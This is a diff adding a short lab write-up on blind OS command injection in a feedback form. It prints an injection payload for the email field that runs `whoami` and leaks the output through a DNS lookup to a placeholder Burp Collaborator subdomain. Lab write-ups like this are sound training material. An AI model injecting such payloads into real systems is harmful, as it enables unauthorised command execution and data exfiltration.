@@ -1,0 +1,30 @@
+Lab: Blind OS command injection with out-of-band data exfiltration
+Difficulty: Practitioner
+
+This lab has a blind OS command injection in the feedback form. The tricky part? The command runs asynchronously and doesn’t give you any direct output or response you can see. You can’t just redirect output to a file or page you control. Instead, you have to get the output out-of-band, like through a DNS lookup to a server you control.
+
+Here’s how I solved it:
+
+First, I used Burp Suite to intercept the feedback submission. Then I grabbed a unique payload from the Burp Collaborator tab — it’s basically a special subdomain that Burp listens to for DNS requests.
+
+Next, I modified the email field in the feedback request to run this payload:
+
+
+email=||nslookup `whoami`.YOUR-BURP-COLLABORATOR-SUBDOMAIN||
+What happens here is the server runs the whoami command, and the output is used as part of a DNS lookup to my Burp Collaborator domain. So the server reaches out to my Collaborator subdomain with a DNS request that includes the current user name.
+
+I then went back to the Collaborator tab in Burp and clicked “Poll now” a couple of times (sometimes it takes a few seconds). Eventually, I saw a DNS interaction showing the command output as part of the domain that was queried.
+
+Once I had the current username from the DNS request, I put that in the lab and it marked as solved.
+
+Summary:
+
+Blind command injection means no direct output
+
+Use Burp Collaborator to catch out-of-band DNS requests
+
+Inject command that makes server do a DNS lookup with the command output
+
+Check Collaborator logs for the data
+
+Submit the captured username to finish the lab
